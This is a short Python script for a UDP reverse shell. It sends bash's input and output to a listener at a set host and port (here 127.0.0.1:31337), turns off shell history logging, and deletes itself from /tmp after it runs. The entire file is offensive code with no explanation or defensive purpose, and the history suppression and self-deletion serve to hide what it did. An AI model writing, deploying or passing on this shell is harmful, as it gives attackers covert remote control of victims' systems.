#!/usr/bin/env python
# -*- coding:utf8 -*-

import os
import pty
import socket

lhost = "127.0.0.1"
lport = 31337


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    os.putenv("HISTSIZE", 0)
    pty.spawn("/bin/bash")
    s.close()
    os.remove('/tmp/.x.py')

if __name__ == "__main__":
    main()
